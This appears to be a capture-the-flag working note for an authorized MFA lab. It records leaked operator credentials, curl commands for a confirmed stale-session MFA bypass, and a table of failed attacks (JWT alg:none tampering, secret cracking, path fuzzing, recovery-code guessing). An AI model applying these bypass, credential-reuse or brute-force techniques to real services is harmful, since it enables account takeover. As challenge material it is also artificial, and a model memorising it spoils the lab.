# Northstar MFA — Recovery Login + Smoke-Test Payloads

**Context:** PwnBox Northstar Cloud MFA lab (authorized)  
**Requires:** Valid session for smoke-test; recovery codes or admin session for Maya

## Leaked operator credentials (from legacy JS)

```
email: maya.chen@northstar.local
password: Orbit-Saffron-47!
```

Source: `GET /assets/legacy/release-admin.41c8.js`

## TOTP generation (MFA enable / verify)

```python
import pyotp
code = pyotp.TOTP("<SECRET_FROM_SETUP_PAGE>").now()
```

Setup page: `GET /settings/security/mfa/setup` → `<code>BASE32SECRET</code>`

## Enable MFA

```bash
curl -sS -c "$JAR" -b "$JAR" -X POST "$BASE/settings/security/mfa/enable" \
  -d "code=<6-digit-totp>"
```

**Signal:** 302 → `/settings/security`, session cookie re-set, JWT still `twoFactorVerified:false`.

## Stale-session bypass check

```bash
# Login after MFA enabled
curl -sS -c "$JAR" -b "$JAR" -X POST "$BASE/login" \
  -d "email=<user>&password=<pass>"
# → 302 /auth/mfa?challenge=<hex>

# Old cookie still works
curl -sS -b "$JAR" "$BASE/api/session"   # mfaVerified:false
curl -sS -b "$JAR" -o /dev/null -w "%{http_code}" "$BASE/app"  # 200
```

## MFA verify — TOTP

```bash
curl -sS -c "$JAR" -b "$JAR" -X POST \
  "$BASE/auth/mfa/verify?challenge=<CHALLENGE>" \
  -d "code=<6-digit-totp>"
# → 302 /app, twoFactorVerified:true in new JWT
```

## MFA verify — recovery code

```bash
curl -sS -c "$JAR" -b "$JAR" -X POST \
  "$BASE/auth/mfa/verify?challenge=<CHALLENGE>" \
  -d "use_recovery=1&code=<8-char-code>"
```

**Requirements:**

- Must use `use_recovery=1` — plain 8-char without it → 400
- 6-digit TOTP format on recovery param → 401 Incorrect
- Rate limiting (429) after repeated attempts on Maya challenge

## Maya login → challenge

```bash
curl -sS -i -X POST "$BASE/login" \
  -d "email=maya.chen@northstar.local&password=Orbit-Saffron-47!"
# → 302 /auth/mfa?challenge=<24-hex>
# → NO Set-Cookie until verify
```

## Smoke-test (flag endpoint)

```bash
curl -sS -b "$JAR" -X POST "$BASE/api/legacy/releases/smoke-test" \
  -H "Content-Type: application/json" \
  -d '{"email":"maya.chen@northstar.local","password":"Orbit-Saffron-47!"}'
```

| Session | Expected |
|---------|----------|
| None | 401 `authentication_required` |
| Member (any MFA state) | 404 `Not found` |
| Admin (hypothesis) | 200 + `pwnbox{...}` |

## JWT decode (inspect claims)

```python
import base64, json
token = "<session_cookie_value>"
payload = token.split('.')[1]
payload += '=' * ((4 - len(payload) % 4) % 4)
print(json.loads(base64.urlsafe_b64decode(payload)))
# → sub, twoFactorVerified, iat, exp (no role)
```

## Why failed payloads failed

| Payload | Why it failed |
|---------|---------------|
| smoke-test body only, no cookie | 401 — endpoint requires session |
| Member session + Maya body creds | 404 — role not admin |
| JWT alg:none / tampered payload | 401 — signature enforced |
| Common JWT secrets | No crack on tested wordlists |
| Recovery path fuzz (100+ paths) | All 404 — view route not found |
| Maya common recovery codes | 401 Incorrect / 429 rate limit |
| Legacy console headers on smoke-test | 404 — no bypass |

## Working test (confirmed)

Stale MFA bypass for **member** — access `/app` without completing MFA verify after re-login. Does **not** grant smoke-test access.
